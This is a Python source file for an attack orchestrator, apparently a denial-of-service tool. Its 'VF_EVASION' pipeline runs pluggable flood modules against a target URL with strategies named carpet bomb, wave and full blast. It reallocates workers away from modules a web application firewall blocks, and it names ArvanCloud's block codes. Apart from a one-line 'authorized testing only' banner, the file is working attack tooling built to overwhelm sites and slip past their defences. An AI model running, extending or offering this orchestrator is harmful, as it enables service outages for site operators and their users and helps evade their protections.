#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  Attack Pipeline — VF_EVASION Module                                    ║
║  Request Pipeline Orchestration — combine attack types intelligently    ║
║                                                                          ║
║  Not a standalone attack, but an orchestrator that runs attacks in      ║
║  sequence or parallel. Pipeline strategies:                              ║
║    RECON_THEN_ATTACK — Light recon → identify weak points → focus       ║
║    WARM_UP          — Start slow → increase intensity → full blast      ║
║    CARPET_BOMB      — Run all attack types simultaneously               ║
║    SURGICAL         — Focus one weak endpoint with maximum force        ║
║    WAVE             — Attack in waves with cooldown between them        ║
║    ADAPTIVE         — Monitor WAF response, switch based on what works  ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
from typing import Dict, List, Optional, Any, Callable
from collections import deque
from enum import Enum
from dataclasses import dataclass, field
from urllib.parse import urlparse


# ═══════════════════════════════════════════════════════════════════════════════
# Color Codes
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ═══════════════════════════════════════════════════════════════════════════════
# Pipeline Strategy Enum
# ═══════════════════════════════════════════════════════════════════════════════

class PipelineStrategy(Enum):
    RECON_THEN_ATTACK = "recon_then_attack"
    WARM_UP = "warm_up"
    CARPET_BOMB = "carpet_bomb"
    SURGICAL = "surgical"
    WAVE = "wave"
    ADAPTIVE = "adaptive"


# ═══════════════════════════════════════════════════════════════════════════════
# Attack Module Stats
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class AttackStats:
    """Per-attack-module statistics."""
    name: str = ""
    total_requests: int = 0
    success_count: int = 0
    blocked_count: int = 0
    error_count: int = 0
    rps: float = 0.0
    active_workers: int = 0
    requested_workers: int = 0
    start_time: float = 0.0
    block_rate: float = 0.0

    @property
    def success_rate(self) -> float:
        total = self.success_count + self.blocked_count
        return self.success_count / total if total > 0 else 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# Pipeline Phase
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class PipelinePhase:
    """A phase in the attack pipeline."""
    name: str
    strategy: PipelineStrategy
    duration_seconds: float = 0  # 0 = unlimited
    attack_modules: List[str] = field(default_factory=list)
    worker_counts: Dict[str, int] = field(default_factory=dict)
    active: bool = False
    completed: bool = False


class AttackPipeline:
    """
    Request Pipeline Orchestration — combine multiple attack types intelligently.

    Accepts a list of attack modules and their configurations, then runs them
    as async tasks according to the selected strategy.

    Features:
    - Multiple pipeline strategies (recon, warm-up, carpet bomb, etc.)
    - Auto-adjusts: if one attack is 80%+ blocked, reduce its workers
    - Phase transitions logged and displayed
    - Collects stats from all attacks into unified dashboard
    """

    def __init__(self, url: str, attack_profile: Dict):
        """
        Args:
            url: Target URL
            attack_profile: Dict with keys:
                strategy: PipelineStrategy or str
                modules: List[Dict] — each with keys: name, attack_fn, workers, config
                wave_count: int (for WAVE strategy)
                wave_cooldown: float (seconds between waves)
                warm_up_duration: float (seconds for warm-up phase)
                recon_duration: float (seconds for recon phase)
                surgical_endpoint: str (path for SURGICAL strategy)
        """
        self.url = url
        parsed = urlparse(url)
        self.domain = parsed.netloc.split(':')[0]
        self.attack_profile = attack_profile

        # Parse strategy
        strategy_val = attack_profile.get("strategy", "adaptive")
        if isinstance(strategy_val, PipelineStrategy):
            self.strategy = strategy_val
        else:
            try:
                self.strategy = PipelineStrategy(strategy_val.lower())
            except ValueError:
                self.strategy = PipelineStrategy.ADAPTIVE

        # Attack modules
        self.modules: Dict[str, Dict] = {}
        for mod in attack_profile.get("modules", []):
            self.modules[mod["name"]] = {
                "attack_fn": mod.get("attack_fn"),
                "workers": mod.get("workers", 10),
                "config": mod.get("config", {}),
                "task": None,
            }

        # Per-module stats
        self.stats: Dict[str, AttackStats] = {
            name: AttackStats(name=name, requested_workers=info["workers"])
            for name, info in self.modules.items()
        }

        # Pipeline state
        self._phases: List[PipelinePhase] = []
        self._current_phase: Optional[PipelinePhase] = None
        self._running: bool = False
        self._tasks: List[asyncio.Task] = []
        self._start_time: float = 0
        self._combined_rps: float = 0.0
        self._overall_success_rate: float = 0.0
        self._adjustment_interval: float = 10  # seconds between auto-adjustments
        self._last_adjustment: float = 0

        # Wave state
        self._wave_count: int = attack_profile.get("wave_count", 3)
        self._wave_cooldown: float = attack_profile.get("wave_cooldown", 30)
        self._current_wave: int = 0

        # Build pipeline phases based on strategy
        self._build_phases()

    def _build_phases(self):
        """Build pipeline phases based on the selected strategy."""
        module_names = list(self.modules.keys())

        if self.strategy == PipelineStrategy.RECON_THEN_ATTACK:
            self._phases = [
                PipelinePhase(
                    name="RECON",
                    strategy=self.strategy,
                    duration_seconds=self.attack_profile.get("recon_duration", 30),
                    attack_modules=module_names,
                    worker_counts={name: max(1, self.modules[name]["workers"] // 10) for name in module_names},
                ),
                PipelinePhase(
                    name="ATTACK",
                    strategy=self.strategy,
                    duration_seconds=0,  # unlimited
                    attack_modules=module_names,
                    worker_counts={name: self.modules[name]["workers"] for name in module_names},
                ),
            ]

        elif self.strategy == PipelineStrategy.WARM_UP:
            self._phases = [
                PipelinePhase(
                    name="WARM",
                    strategy=self.strategy,
                    duration_seconds=self.attack_profile.get("warm_up_duration", 60),
                    attack_modules=module_names,
                    worker_counts={name: max(1, self.modules[name]["workers"] // 5) for name in module_names},
                ),
                PipelinePhase(
                    name="RAMP_UP",
                    strategy=self.strategy,
                    duration_seconds=30,
                    attack_modules=module_names,
                    worker_counts={name: self.modules[name]["workers"] // 2 for name in module_names},
                ),
                PipelinePhase(
                    name="FULL_BLAST",
                    strategy=self.strategy,
                    duration_seconds=0,
                    attack_modules=module_names,
                    worker_counts={name: self.modules[name]["workers"] for name in module_names},
                ),
            ]

        elif self.strategy == PipelineStrategy.CARPET_BOMB:
            self._phases = [
                PipelinePhase(
                    name="CARPET_BOMB",
                    strategy=self.strategy,
                    duration_seconds=0,
                    attack_modules=module_names,
                    worker_counts={name: self.modules[name]["workers"] for name in module_names},
                ),
            ]

        elif self.strategy == PipelineStrategy.SURGICAL:
            # Focus all workers on one attack module
            primary = module_names[0] if module_names else ""
            self._phases = [
                PipelinePhase(
                    name="SURGICAL",
                    strategy=self.strategy,
                    duration_seconds=0,
                    attack_modules=[primary],
                    worker_counts={name: sum(m["workers"] for m in self.modules.values())
                                   if name == primary else 0
                                   for name in module_names},
                ),
            ]

        elif self.strategy == PipelineStrategy.WAVE:
            for i in range(self._wave_count):
                self._phases.append(
                    PipelinePhase(
                        name=f"WAVE_{i+1}",
                        strategy=self.strategy,
                        duration_seconds=self.attack_profile.get("wave_duration", 60),
                        attack_modules=module_names,
                        worker_counts={name: self.modules[name]["workers"] for name in module_names},
                    )
                )
                # Cooldown phase between waves
                if i < self._wave_count - 1:
                    self._phases.append(
                        PipelinePhase(
                            name=f"COOLDOWN_{i+1}",
                            strategy=self.strategy,
                            duration_seconds=self._wave_cooldown,
                            attack_modules=[],
                            worker_counts={},
                        )
                    )

        elif self.strategy == PipelineStrategy.ADAPTIVE:
            self._phases = [
                PipelinePhase(
                    name="INITIAL_RECON",
                    strategy=self.strategy,
                    duration_seconds=15,
                    attack_modules=module_names,
                    worker_counts={name: max(1, self.modules[name]["workers"] // 5) for name in module_names},
                ),
                PipelinePhase(
                    name="ADAPTIVE_ATTACK",
                    strategy=self.strategy,
                    duration_seconds=0,
                    attack_modules=module_names,
                    worker_counts={name: self.modules[name]["workers"] for name in module_names},
                ),
            ]

    async def run(self, stop_event: asyncio.Event, stats_callback: Optional[Callable] = None) -> Dict:
        """
        Run the attack pipeline.

        Args:
            stop_event: asyncio.Event to signal shutdown
            stats_callback: Optional callback(stats_dict) called periodically

        Returns:
            Final stats dict
        """
        self._running = True
        self._start_time = time.time()

        print(f"\n  {C.BD}{C.CY}[PIPELINE] Starting {self.strategy.value} pipeline against {self.domain}{C.RS}")
        print(f"  {C.CY}[PIPELINE] {len(self._phases)} phases, {len(self.modules)} attack modules{C.RS}")

        for phase in self._phases:
            if stop_event.is_set():
                break

            self._current_phase = phase
            phase.active = True
            phase_start = time.time()

            print(f"\n  {C.BD}{C.M}{'='*60}{C.RS}")
            print(f"  {C.BD}{C.M}[PIPELINE] Phase: {phase.name} | "
                  f"Modules: {len(phase.attack_modules)} | "
                  f"Workers: {sum(phase.worker_counts.values())}{C.RS}")
            print(f"  {C.BD}{C.M}{'='*60}{C.RS}")

            if not phase.attack_modules:
                # Cooldown phase
                print(f"  {C.Y}[PIPELINE] Cooldown — {phase.duration_seconds}s{C.RS}")
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=phase.duration_seconds)
                except asyncio.TimeoutError:
                    pass
                phase.completed = True
                continue

            # Start attack tasks for this phase
            self._tasks = []
            for mod_name in phase.attack_modules:
                if mod_name not in self.modules:
                    continue

                workers = phase.worker_counts.get(mod_name, 1)
                self.stats[mod_name].active_workers = workers
                self.stats[mod_name].start_time = time.time()

                mod = self.modules[mod_name]
                attack_fn = mod.get("attack_fn")

                if attack_fn and callable(attack_fn):
                    # Launch the attack function as an async task
                    task = asyncio.create_task(
                        self._run_attack_module(mod_name, attack_fn, workers, stop_event, mod["config"])
                    )
                    self._tasks.append(task)
                    mod["task"] = task

            # Monitor phase
            phase_duration = phase.duration_seconds
            while not stop_event.is_set():
                elapsed = time.time() - phase_start

                # Check phase duration
                if phase_duration > 0 and elapsed >= phase_duration:
                    break

                # Auto-adjust worker allocation (for ADAPTIVE strategy)
                if self.strategy == PipelineStrategy.ADAPTIVE:
                    self._auto_adjust_workers()

                # Calculate combined stats
                self._calculate_combined_stats()

                # Stats callback
                if stats_callback:
                    try:
                        stats_callback(self.get_stats())
                    except Exception:
                        pass

                # Print dashboard
                self._print_dashboard()

                await asyncio.sleep(2)

            # Cancel tasks for this phase
            for task in self._tasks:
                task.cancel()
            for task in self._tasks:
                try:
                    await task
                except asyncio.CancelledError:
                    pass

            phase.active = False
            phase.completed = True

        self._running = False
        self._calculate_combined_stats()

        print(f"\n  {C.BD}{C.G}[PIPELINE] Pipeline complete — "
              f"Total: {sum(s.total_requests for s in self.stats.values())} req, "
              f"Success: {self._overall_success_rate:.0%}{C.RS}")

        return self.get_stats()

    async def _run_attack_module(self, name: str, attack_fn: Callable,
                                  workers: int, stop_event: asyncio.Event,
                                  config: Dict):
        """
        Run a single attack module with the given number of workers.

        The attack_fn should be an async callable that accepts:
            (url, workers, stop_event, stats_dict, config)
        """
        try:
            await attack_fn(self.url, workers, stop_event, self.stats[name], config)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"  {C.R}[PIPELINE] Module {name} error: {e}{C.RS}")

    def _auto_adjust_workers(self):
        """
        Auto-adjust worker allocation based on block rates.

        If one attack is 80%+ blocked, reduce its workers and add
        them to more successful attacks.
        """
        now = time.time()
        if now - self._last_adjustment < self._adjustment_interval:
            return
        self._last_adjustment = now

        if not self._current_phase:
            return

        adjustments_made = False
        freed_workers = 0

        # Identify heavily blocked attacks
        for name, stat in self.stats.items():
            total = stat.success_count + stat.blocked_count
            if total < 10:
                continue

            block_rate = stat.blocked_count / total

            if block_rate > 0.8 and stat.active_workers > 2:
                # Reduce workers for heavily blocked attack
                reduce_by = max(1, stat.active_workers // 3)
                stat.active_workers -= reduce_by
                freed_workers += reduce_by
                adjustments_made = True
                print(f"  {C.Y}[PIPELINE] ADJUST: {name} block_rate={block_rate:.0%}, "
                      f"reduced workers by {reduce_by}{C.RS}")

        # Redistribute freed workers to successful attacks
        if freed_workers > 0:
            # Sort by success rate descending
            successful = sorted(
                [(n, s) for n, s in self.stats.items() if s.active_workers > 0],
                key=lambda x: x[1].success_rate,
                reverse=True,
            )

            for name, stat in successful:
                if freed_workers <= 0:
                    break
                add = max(1, freed_workers // max(len(successful), 1))
                stat.active_workers += add
                freed_workers -= add
                adjustments_made = True
                print(f"  {C.G}[PIPELINE] ADJUST: {name} +{add} workers (success_rate={stat.success_rate:.0%}){C.RS}")

    def _calculate_combined_stats(self):
        """Calculate combined stats across all attack modules."""
        total_requests = 0
        total_success = 0
        total_blocked = 0

        for stat in self.stats.values():
            total_requests += stat.total_requests
            total_success += stat.success_count
            total_blocked += stat.blocked_count

        elapsed = time.time() - self._start_time if self._start_time else 1
        self._combined_rps = total_requests / max(elapsed, 0.001)

        total_decisive = total_success + total_blocked
        self._overall_success_rate = total_success / total_decisive if total_decisive > 0 else 0.0

    def _print_dashboard(self):
        """Print a brief pipeline dashboard."""
        phase_name = self._current_phase.name if self._current_phase else "IDLE"
        print(f"  {C.DM}[PIPELINE] Phase:{C.W}{phase_name}{C.DM} | "
              f"RPS:{C.G}{self._combined_rps:.0f}{C.DM} | "
              f"Success:{C.G}{self._overall_success_rate:.0%}{C.DM} | "
              f"Total:{C.W}{sum(s.total_requests for s in self.stats.values()):,}{C.RS}", end="\r")

    def get_stats(self) -> Dict:
        """Get current pipeline statistics."""
        return {
            "strategy": self.strategy.value,
            "running": self._running,
            "current_phase": self._current_phase.name if self._current_phase else "none",
            "combined_rps": self._combined_rps,
            "overall_success_rate": self._overall_success_rate,
            "total_requests": sum(s.total_requests for s in self.stats.values()),
            "total_success": sum(s.success_count for s in self.stats.values()),
            "total_blocked": sum(s.blocked_count for s in self.stats.values()),
            "modules": {
                name: {
                    "total_requests": s.total_requests,
                    "success": s.success_count,
                    "blocked": s.blocked_count,
                    "block_rate": s.block_rate,
                    "success_rate": s.success_rate,
                    "active_workers": s.active_workers,
                }
                for name, s in self.stats.items()
            },
            "phases": [
                {"name": p.name, "active": p.active, "completed": p.completed}
                for p in self._phases
            ],
        }

    def update_module_stats(self, name: str, total: int = 0, success: int = 0,
                             blocked: int = 0, error: int = 0, rps: float = 0.0):
        """
        Update stats for a specific attack module. Called by attack functions.

        Args:
            name: Module name
            total: Total requests sent
            success: Successful (non-blocked) requests
            blocked: WAF-blocked requests (ArvanCloud: 403/429/500/503)
            error: Connection errors
            rps: Current requests per second
        """
        if name in self.stats:
            self.stats[name].total_requests += total
            self.stats[name].success_count += success
            self.stats[name].blocked_count += blocked
            self.stats[name].error_count += error
            self.stats[name].rps = rps

            total_decisive = self.stats[name].success_count + self.stats[name].blocked_count
            self.stats[name].block_rate = (
                self.stats[name].blocked_count / total_decisive if total_decisive > 0 else 0.0
            )
